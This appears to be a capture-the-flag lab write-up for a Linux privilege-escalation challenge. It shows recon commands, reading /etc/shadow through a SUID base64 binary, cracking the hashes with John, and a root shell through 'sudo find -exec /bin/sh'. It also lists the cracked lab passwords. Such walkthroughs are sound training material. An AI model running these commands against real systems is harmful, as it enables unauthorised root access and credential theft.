# 🎯 **Linux Capstone Challenge**

---

## 🛰️ **Reconnaissance**

```bash
bash
CopyEdit
# List users with home directories
cat /etc/passwd | grep home

# Check system information
uname -a

# Check detailed OS version
cat /proc/version

# Check allowed sudo permissions
sudo -l

```

[](https://github.com/user-attachments/assets/0d9e9da3-e1ec-41c2-a78d-1482eaf09fc9)

---

## 🔍 **Finding SUID Binaries**

```bash
bash
CopyEdit
# Find all files with SUID bit set
find / -type f -perm -04000 -ls 2>/dev/null

# Alternative method (more specific)
find / -type f -perm -u=s -ls 2>/dev/null

```

[](https://github.com/user-attachments/assets/c1563691-76ef-44f5-bd2a-55e3f7b5759f)

---

## 🧬 **Exploiting Base64 SUID Binary**

Since `base64` has SUID permissions, we can **read protected files**:

```bash
bash
CopyEdit
# Read /etc/passwd
LFILE=/etc/passwd
base64 "$LFILE" | base64 --decode

# Read /etc/shadow
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode

```

➡️ **Save** the output into two files: `passwd.txt` and `shadow.txt`.

---

## 🛠️ **Cracking Passwords with John**

First, create a password hash file:

```bash
bash
CopyEdit
unshadow passwd.txt shadow.txt > passwords.txt

```

Then crack it using John and a wordlist:

```bash
bash
CopyEdit
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt

```

### ✅ Passwords Found:

| Username | Password |
| --- | --- |
| missy | Password1 |
| leonard | Penny123 |

[](https://github.com/user-attachments/assets/188f95e6-8865-4562-bc86-9afc3e280557)

---

## 🔐 **Switch User to Missy**

```bash
bash
CopyEdit
su missy
cd /home/missy/Documents
cat flag1.txt

```

[](https://github.com/user-attachments/assets/5d3a6a57-4a02-4bfe-923d-4a25c10f8dfe)

---

## 🚀 **Privilege Escalation (Missy User)**

Check sudo permissions:

```bash
bash
CopyEdit
sudo -l

```

**Exploit via `find` command:**

```bash
bash
CopyEdit
sudo find . -exec /bin/sh \; -quit

```

Move to root directory and capture second flag:

```bash
bash
CopyEdit
cd /home/rootflag
cat flag2.txt

```

[](https://github.com/user-attachments/assets/1002eda2-ead5-450c-8248-0460b91e535b)

---

## 🛤️ **Alternative Exploit Path**

Another way to get a root shell via `find`:

[](https://github.com/user-attachments/assets/9a113d36-4cdc-4e1d-97ad-7c0fbdb62dbc)

---

# ⚡ Summary

- ✅ Recon → Find users and OS
- ✅ SUID → Exploit base64 to read protected files
- ✅ Passwords → Cracked with John
- ✅ Privilege Escalation → Using `find` with sudo rights
- ✅ Flags Captured!
